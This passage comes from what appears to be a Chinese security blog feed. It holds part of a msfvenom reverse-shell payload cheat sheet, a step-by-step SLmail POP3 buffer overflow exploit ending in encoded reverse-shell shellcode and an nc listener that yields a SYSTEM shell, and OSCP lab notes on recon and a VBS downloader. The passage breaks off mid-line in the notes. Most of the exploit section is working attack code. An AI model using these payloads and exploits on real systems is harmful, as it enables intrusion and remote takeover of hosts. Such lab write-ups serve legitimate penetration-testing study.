LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</pre></td></tr></tbody></table><p><strong>ASP</strong></p><table><tbody><tr><td class="code"><pre class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</pre></td></tr></tbody></table><p><strong>JSP</strong></p><table><tbody><tr><td class="code"><pre class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</pre></td></tr></tbody></table><p><strong>WAR</strong></p><table><tbody><tr><td class="code"><pre class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</pre></td></tr></tbody></table><h4 id="Scripting-Payloads"><a href="#Scripting-Payloads" class="headerlink" title="Scripting Payloads"></a>Scripting Payloads</h4><p><strong>Python</strong></p><table><tbody><tr><td class="code"><pre class="bash">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</pre></td></tr></tbody></table><p><strong>Bash</strong></p><table><tbody><tr><td class="code"><pre class="bash">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</pre></td></tr></tbody></table><p><strong>Perl</strong></p><table><tbody><tr><td class="code"><pre class="bash">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</pre></td></tr></tbody></table><h4 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h4><p>For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</p><p><strong>Linux Based Shellcode</strong></p><table><tbody><tr><td class="code"><pre class="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</pre></td></tr></tbody></table><p><strong>Windows Based Shellcode</strong></p><table><tbody><tr><td class="code"><pre class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</pre></td></tr></tbody></table><p><strong>Mac Based Shellcode</strong></p><table><tbody><tr><td class="code"><pre class="bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</pre></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> metasploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows缓冲区溢出理解及实验</title>
      <link href="56833d657261/"/>
      <url>56833d657261/</url>
      
        <content type="html"><![CDATA[<p>以SLmail为例 (一个邮件服务器软件)</p><p>工具 Immunity Debugger</p><p>先将Debugger Attach上SLmail的主进程</p><p> </p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004062641-1024x632.png"></p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004062709-1024x639.png"></p><p>在点那个</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004062739.png"></p><p>让进程解除冰冻状态,转为running</p><p> </p><p>这个时候转到Kali,使用Buffer溢出脚本检测溢出所需的字节,脚本源码如下</p><p>#!/usr/bin/python#!/usr/bin/python<br>import sys<br>import socket<br>target=sys.argv[1]<br>buffer=[“A”]<br>counter=100<br>while len(buffer) &lt;= 30:<br>   buffer.append(“A”*counter)<br>   counter=counter+200<br>for string in buffer:<br>   print “Fuzzing PASS with %s byte” % len(string)<br>   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>   connect=s.connect((target,110))<br>   s.recv(1024)<br>   s.send(‘USER test<br>‘)<br>   s.recv(1024)<br>   s.send(‘PASS ‘ + string + ‘<br>‘)<br>   s.send(‘QUIT<br>‘)<br>   s.close()</p><p>使用该脚本并加上目标参数</p><p>观察,等到Debugger右边EIP指针为41414141(大写A的ASCII编号)时代表溢出成功</p><p>记下python脚本窗口处此时的字节数,暂记为2900 bytes</p><p>重新启动POP3服务,并重新Attach</p><p>使用msf自带工具生成一串buffer</p><p>locate 到 pattern_creat.rb 并在脚本地址后面加上需要的字节长度,生成脚本,此次试验为2900 bytes</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004064106.png"></p><p>看到这时候不难理解,这是需要知道ESP指针指向的是多少个字节,方便后期进行跳转</p><p>编写针对性的溢出脚本</p><p>源码如下</p><p>#!/usr/bin/python<br>import socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p><p>buffer = ‘Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds’</p><p>try:<br>    print “<br>Sending evil buffer…”<br>    s.connect((‘10.11.12.13’,110))<br>    data = s.recv(1024)<br>    s.send(‘USER username’ +’<br>‘)<br>    data = s.recv(1024)<br>    s.send(‘PASS ‘ + buffer + ‘<br>‘)<br>    print “<br>Done!.”<br>except:<br>    print “Could not connect to POP3!”</p><p>此时执行此脚本,再观察Debugger右侧窗口,观察EIP指针所指向的字符串</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004062957.png"></p><p>可以看到字符串为 39694438</p><p>此时利用pattern_create相对的工具pattern_offset查找这串字节相对的位置</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004064903.png"></p><p>可知是位于第2606个字节之后的字节就是EIP所指向的!</p><p>这时修改脚本</p><p>#!/usr/bin/python<br>import socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>buffer = ‘A’*2606 + ‘B’*4 +’C’*16</p><p>try:<br>    print “<br>Sending evil buffer…”<br>    s.connect((‘10.11.12.13’,110))<br>    data = s.recv(1024)<br>    s.send(‘USER username’ +’<br>‘)<br>    data = s.recv(1024)<br>    s.send(‘PASS ‘ + buffer + ‘<br>‘)<br>    print “<br>Done!.”<br>except:<br>    print “Could not connect to POP3!”</p><p>观察可知,前2606个A是没啥用的,而这四个B就是EIP所指向的内容,而后16个C为补全2900个字节所设置的</p><p>执行脚本</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004070231.png"></p><p>观察到如下结果,可知EIP的确被指向到了2606bytes之后的位置,因为BBBB的ASCII码为42424242</p><p>我们再观察ESP的位置在哪里</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004070414.png"></p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004070430.png"></p><p>可以观察到ESP指向的位置在0x0169A128,恰巧也被CCCC给填满了</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004070442.png"></p><p>一般来说一个payload的字节数在315-400之间,所以只要将0169A128开始的内存地址溢出到我们的payload就可以了</p><p>所以我们开始使用msf生成payload,但是要知道,这是在一个程序内存栈中进行decode,肯定会有一些字节被这个程序错误理解</p><p>所以我们需要寻找一些坏字节  也就是Bad Characters</p><p>修改脚本如下</p><p>#!/usr/bin/python<br>import socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>badchars = (<br>“\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10”<br>“\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20”<br>“\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30”<br>“\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40”<br>“\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50”<br>“\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60”<br>“\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70”<br>“\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80”<br>“\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90”<br>“\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0”<br>“\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0”<br>“\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0”<br>“\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0”<br>“\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0”<br>“\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0”<br>“\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff” )<br>#buffer = ‘A’*2606 + ‘B’*4 +’C’*16<br>buffer = ‘A’*2606 + ‘B’*4 + badchars</p><p>try:<br> print “<br>Sending evil buffer…”<br> s.connect((‘10.11.12.13’,110))<br> data = s.recv(1024)<br> s.send(‘USER username’ +’<br>‘)<br> data = s.recv(1024)<br> s.send(‘PASS ‘ + buffer + ‘<br>‘)<br> print “<br>Done!.”<br>except:<br> print “Could not connect to POP3!”</p><p>再次运行该脚本并且dump到ESP位置的内存</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004072409.png"></p><p>可以看到,明显有几个字节被错误编译了,到第10个字节应该是10却变成了29</p><p>所以我们应该在脚本中去掉/x0a,并再次运行</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004072927.png"></p><p>仔细仔细再仔细地看,你会发现少了0D这个字节,说明/0d这个字节也是坏的,从脚本中去除</p><p>同理再次实验,你会发现一切都是正常的,没有坏字节了</p><p>所以,我们知道对于SLmail来说,坏字节有\x00,\x0a,\x0d</p><p>知道了坏字节有哪些,我们就可以生成shellcode啦!</p><p>但但是,我们还得想办法让EIP重定向到我们想要的内存地址!</p><p>这时候,我脑子里第一时间想到的是直接把EIP的地址改成ESP的地址</p><p>直接让执行流执行ESP所定位到的那一串代码不就行了嘛?</p><p>但是实际上在溢出过程中ESP所指向的地址并不会保持不变,</p><p>因为绝大多数程序都是多进程的,ESP的指向并不是按照顺序的单一的</p><p>他会指向奇奇怪怪的地方,所以这个方法不可行!</p><p>那咋办嘞?</p><p>我们知道,在一个程序运行的时候,程序本身首先会被写入到内存中,</p><p>顺带着它需要的各种DLL以及Drive和Modules,</p><p>所以我们可以寻找含有JMP ESP这个指令的各种模块并利用他们</p><p>为了寻找合乎条件的DLL以及模块,我们需要用到第三方模块mona</p><p>在Debugger的下方命令行输入</p><p>!mona modules</p><p>就可以看到所有loaded的modules</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004074503-1024x558.png"></p><p> </p><p>这时候就可以寻找符合条件的modules了</p><p>符合条件的modules需要符合3个条件</p><p>1.本身的base内存地址不包含上面提到的坏字节</p><p>2.没有被前四个反缓冲区溢出机制保护</p><p>这里只有一个DLL满足条件</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004075155-1024x44.png"></p><p>按下工具条上的E来查看所有可被执行的dll</p><p>找到对应的DLL并双击</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004075346.png"></p><p>到主界面search相应的操作</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004075346-1.png"> <img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004080710.png"></p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004080721.png"> <img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004080742.png"> <img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004080752.png"></p><p>但奇怪的是无论是search command和sequence commands都没法找到想要找的jmp esp字节</p><p>这个是很不科学的小概率事件,讲道理一个有用的DLL肯定会包含一两个这个命令</p><p>仔细想过后并且查看了这个DLL的详细信息(工具条按M按钮)</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004081232.png"></p><p>你会发现只有.text区块是被表明了Excutable的,所以可能mona在刚刚的查找中只查找了这个区块</p><p>没有查找其他几个区块,这时候我们可以直接让mona去查找内存,但是得知道相应的命令在内存中是怎么表示的</p><p>这时候就需要msf的nasm_shell工具了</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004081552.png"></p><p>这个时候我们知道jmp esp这个操作会在内存中被表示为 FFE4</p><p>然后我们直接使用mona查找</p><p>!mona find -s “\xff\xe4” -m slmfc.dll</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004081809.png"></p><p>我们发现results里第一个地址不包含坏字节并且是可用的</p><p>我们就使用第一个!</p><p>跳转到对应的内存地址并核对,果然发现有我们梦寐以求的JMP ESP</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004082101.png"></p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004082116.png"></p><p>现在开始修改溢出脚本!</p><p>但但但是,在溢出脚本执行之后,邮件服务肯定会瘫痪,所以为了我们演示需要,需要做一个断点</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004083520.png"></p><p>选中这一行,按F2并点确定 按F8继续执行</p><p>终于可以开始写脚本啦</p><p>首先使用msf去生成一个shellcode</p><p>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.209 LPORT=4444 -f c -a x86 –platform windows -b “\x00\x0a\x0d” -e x86/shikata_ga_nai</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004084219.png"></p><p>生成成功 (一定要注意长度!)</p><p>#!/usr/bin/python<br>import socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>shellcode = (<br>“\xda\xcb\xba\x71\xe5\xde\xcc\xd9\x74\x24\xf4\x58\x29\xc9\xb1”<br>“\x52\x31\x50\x17\x03\x50\x17\x83\xb1\xe1\x3c\x39\xcd\x02\x42”<br>“\xc2\x2d\xd3\x23\x4a\xc8\xe2\x63\x28\x99\x55\x54\x3a\xcf\x59”<br>“\x1f\x6e\xfb\xea\x6d\xa7\x0c\x5a\xdb\x91\x23\x5b\x70\xe1\x22”<br>“\xdf\x8b\x36\x84\xde\x43\x4b\xc5\x27\xb9\xa6\x97\xf0\xb5\x15”<br>“\x07\x74\x83\xa5\xac\xc6\x05\xae\x51\x9e\x24\x9f\xc4\x94\x7e”<br>“\x3f\xe7\x79\x0b\x76\xff\x9e\x36\xc0\x74\x54\xcc\xd3\x5c\xa4”<br>“\x2d\x7f\xa1\x08\xdc\x81\xe6\xaf\x3f\xf4\x1e\xcc\xc2\x0f\xe5”<br>“\xae\x18\x85\xfd\x09\xea\x3d\xd9\xa8\x3f\xdb\xaa\xa7\xf4\xaf”<br>“\xf4\xab\x0b\x63\x8f\xd0\x80\x82\x5f\x51\xd2\xa0\x7b\x39\x80”<br>“\xc9\xda\xe7\x67\xf5\x3c\x48\xd7\x53\x37\x65\x0c\xee\x1a\xe2”<br>“\xe1\xc3\xa4\xf2\x6d\x53\xd7\xc0\x32\xcf\x7f\x69\xba\xc9\x78”<br>“\x8e\x91\xae\x16\x71\x1a\xcf\x3f\xb6\x4e\x9f\x57\x1f\xef\x74”<br>“\xa7\xa0\x3a\xda\xf7\x0e\x95\x9b\xa7\xee\x45\x74\xad\xe0\xba”<br>“\x64\xce\x2a\xd3\x0f\x35\xbd\xd6\xc4\x35\xec\x8f\xd8\x35\x1f”<br>“\x0c\x54\xd3\x75\xbc\x30\x4c\xe2\x25\x19\x06\x93\xaa\xb7\x63”<br>“\x93\x21\x34\x94\x5a\xc2\x31\x86\x0b\x22\x0c\xf4\x9a\x3d\xba”<br>“\x90\x41\xaf\x21\x60\x0f\xcc\xfd\x37\x58\x22\xf4\xdd\x74\x1d”<br>“\xae\xc3\x84\xfb\x89\x47\x53\x38\x17\x46\x16\x04\x33\x58\xee”<br>“\x85\x7f\x0c\xbe\xd3\x29\xfa\x78\x8a\x9b\x54\xd3\x61\x72\x30”<br>“\xa2\x49\x45\x46\xab\x87\x33\xa6\x1a\x7e\x02\xd9\x93\x16\x82”<br>“\xa2\xc9\x86\x6d\x79\x4a\xb6\x27\x23\xfb\x5f\xee\xb6\xb9\x3d”<br>“\x11\x6d\xfd\x3b\x92\x87\x7e\xb8\x8a\xe2\x7b\x84\x0c\x1f\xf6”<br>“\x95\xf8\x1f\xa5\x96\x28”)<br>buffer = ‘A’*2606 + “\x8f\x35\x4a\x5f” + “\x90”*16 + shellcode + “C”*(3500-2606-4-351-16)<br>try:<br>    print “<br>Sending evil buffer…”<br>    s.connect((‘10.11.12.13’,110))<br>    data = s.recv(1024)<br>   s.send(‘USER username’ +’<br>‘)<br>    data = s.recv(1024)<br>    s.send(‘PASS ‘ + buffer + ‘<br>‘)<br>    print “<br>Done!.”<br>except:<br>   print “Could not connect to POP3!”</p><p>buffer的A*2606是为了达到EIP点,使程序下一步操作跳转到slmc.dll代码中的一个jmp esp</p><p>这样在esp地址下的我们的shellcode便可得到执行</p><p>那16个\x90是为了防止shellcode程序的开头一部分被编译器认为是垃圾不去处理,总之就是为了告诉编译器我后面的是程序!</p><p>写好脚本,在kali攻击机的4444端口开启监听</p><p>nc -lvp 4444</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004085706.png"></p><p>执行脚本!</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004085715.png"></p><p>shell get √√√</p><p>查看下权限</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171004085902.png"></p><p>是最高系统权限,渗透完成</p>]]></content>
      
      
      <categories>
          
          <category> 逆向与二进制 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSCP临时笔记</title>
      <link href="0dd0015d027f/"/>
      <url>0dd0015d027f/</url>
      
        <content type="html"><![CDATA[<p>Kali自带的http服务是apache2,网站根目录在</p><p>/var/www</p><p>Kali将某些程序加入开机启动项</p><p>update-rc.d ssh enable</p><p>systemctl enable ssh  //加入启动项</p><p>systemctl ssh start //启动</p><p>图形化启动项管理软件rcconf</p><p> </p><p>cat index.html |grep “href=”|cut -d”/“ -f 3|grep “cisco.com”|cut -d’”‘ -f 1|sort -u &gt;cisco.txt</p><p>index.html为思科官网的主页文件,目标是提取网页中所有和思科相关的网址</p><p>第一个过滤规则  |grep “href=”  的意思是保留所有有href=这一字符串的行</p><p>第二个过滤规则的 -d”/“ 是以 / 为分界将每行文本划为不同的块 -d 理解为divide</p><p>-f 的意思是选中第三块的内容作为需要的内容</p><p>第三个过滤规则意思是保留有cisco.com的行</p><p>第四个过滤规则是排除掉网址后不需要的块</p><p>第五个规则是合并所有相同的</p><p>&gt; cisco.txt 意思是将结果导入到cisco.txt并保存</p><p> </p><p>#!/bin/bash<br>for url in $(cat cisco.txt);do<br>host $url |grep “has address” |cut -d” “ -f 4 &amp;<br>done</p><p>这个脚本的意思是将cisco.txt中的所有网址都通过host命令过滤截取出ip</p><p>后面加个&amp;的意思是当条命令同时多线程运行</p><p> </p><p>#!/bin/bash<br>for ip in $(seq 1 254);do<br>ping -c 1 10.11.1.$ip |grep “bytes from” |cut -d “” -f 4 |cut -d”:” -f 1 &amp;<br>done</p><p>这个命令的意思是ping 10.11.1.0/24的ip各一次,并显示有结果的ip</p><p> </p><p>nc -vn 10.11.12.13 25 可以起到 telnet 10.11.12.13 25的效果</p><p> </p><p>host -t ns megacorpone.com</p><p>查询megacorpone.com的dns服务器</p><p>host -l megacorpone.com ns2.megacorpone.com</p><p>连接到ns2.megacorpone.com，并查询获取所有megacorpone的子域名</p><p>SNMP协议  经常被人忽视  UDP161端口 貌似直接扫扫不出来开不开放</p><p>扫描命令:   需要一个community文件和ip列表文件</p><p>onesixtyone -c community -i ip</p><h4 id="community"><a href="#community" class="headerlink" title="community"></a>community</h4><p>public</p><p>private</p><p>manager</p><h5 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h5><p>10.11.1.1</p><p>10.11.1.2</p><p>10.11.1.3</p><p>写脚本爽过吸大麻</p><p>SNMP扫描器</p><p>编译linux下的.c文件使用gcc</p><p>gcc example.c -o balabala</p><p>./balabala</p><p>编译Windows环境下的.c文件使用mingw32</p><p>究极windows下的wget.vbs程序,适用于下载简单exe</p><p>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs<br>echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs<br>echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs<br>echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs<br>echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs<br>echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs<br>echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs<br>echo Err.Clear &gt;&gt; wget.vbs<br>echo Set http = Nothing &gt;&gt; wget.vbs<br>echo Set http = 